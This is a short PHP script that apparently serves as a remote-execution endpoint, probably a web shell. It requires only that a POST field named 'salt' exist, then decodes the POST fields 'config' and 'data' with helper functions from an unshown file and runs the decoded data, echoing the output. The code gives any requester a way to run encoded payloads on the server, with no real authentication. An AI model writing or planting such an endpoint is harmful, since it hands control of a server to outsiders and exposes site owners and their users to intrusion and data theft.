<?php

if (!isset($_POST['salt'])) {
    die ("ERROR: NO AUTH");
}

require("wsfunctions.php");
$wsw = new ws_wrapper();

// Do some pre-settings
$wsw->ws_set($_POST['salt']);

if (isset($_POST['config'])) {
    $wsw->ws_con($wsw->ws_dec($_POST['config']));
}

$returns = $wsw->ws_run($wsw->ws_dec($_POST['data']));

echo $returns;

/** End of file **/
